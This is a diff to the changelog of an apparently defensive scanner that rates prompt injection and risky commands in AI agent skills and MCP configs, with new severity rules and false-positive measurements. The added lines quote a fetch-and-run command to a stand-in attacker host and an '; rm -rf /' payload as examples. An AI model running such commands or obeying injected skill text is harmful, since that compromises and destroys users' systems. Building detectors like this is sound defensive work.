@@ -81,6 +81,26 @@ that made the GitHub Action miss MCP configs. See the
   PII, and a real email is MEDIUM; `sec_unbounded_access` is MEDIUM unless a
   privileged action is reachable; an `https://` installer piped into a shell in
   Markdown is HIGH (CRITICAL in scripts, or for raw IPs and decoded payloads).
+- **Quoted attack examples are MEDIUM.** Security skills and write-ups quote
+  attacks (`curl attacker.com/shell | bash`, injection-pattern tables, `; rm -rf /`
+  payloads). Lines with evidence of describing an attack (attacker placeholder
+  hosts, injected payloads, detection regexes, example labels, catalog tables,
+  attack-discussion words) are reported as MEDIUM with a `severity_note`, and do
+  not escalate document-level findings. Generic wording ("for example") does not
+  count, so it cannot be used to lower a real instruction.
+- **A privileged capability alone is MEDIUM.** `sec_privileged_sink_access` is
+  HIGH only when untrusted content (web pages, issue comments, emails, tool
+  output, retrieved documents) or autonomous routing reaches the capability, and
+  CRITICAL with escalation. MCP servers keep HIGH, since the model drives them.
+- **Other precision fixes:** `sec_unbounded_persona` needs an order and is
+  MEDIUM; credentials labelled as documentation examples (❌, "Example key:",
+  credential-type tables) are MEDIUM; approval-bypass flags in settings tables
+  or prohibitions are MEDIUM; a zero-width space escaping a code fence is not
+  reported; model descriptions ("tts-1 ignore instructions"), "with no filter",
+  `delete_user(id)` and "Decode params and execute arbitrage" are not injection.
+- **Linear-time matching.** A Markdown table separator could make a new pattern
+  backtrack exponentially and hang a scan; patterns are now linear, with a
+  timing test on hostile input.
 - **Skill measurements** (details and method in the release note). Published
   clean skills flagged HIGH/CRITICAL, untouched set of 254 from five repositories:
   146 → 46 (`scan`), 142 → 37 (`repo`). Malicious skills caught: 20/20 on the
@@ -88,7 +108,10 @@ that made the GitHub Action miss MCP configs. See the
   frozen, and 12/12 after closing the gaps it exposed. On an offensive-security
   skill pack (elementalsouls/Claude-BugHunter, 83 skills full of attack
   payloads) critical/high findings went 84 → 53 and its unpinned
-  community-skill installer is now reported.
+  community-skill installer is now reported. On a sealed set of 343 published
+  skills from seven repositories, scored once after the work: 100 → 45 flagged
+  (`scan`, 29% → 13%) and 48 → 32 (`repo`, 14% → 9.3%); Cisco skill-scanner
+  flags 17 (5%).
 - **Prompt injection is CRITICAL everywhere.** `promptsonar repo` and the GitHub
   Action rated a direct injection in a live prompt, skill or code as a LOW
   "hardening suggestion" when no privileged action was reachable, while
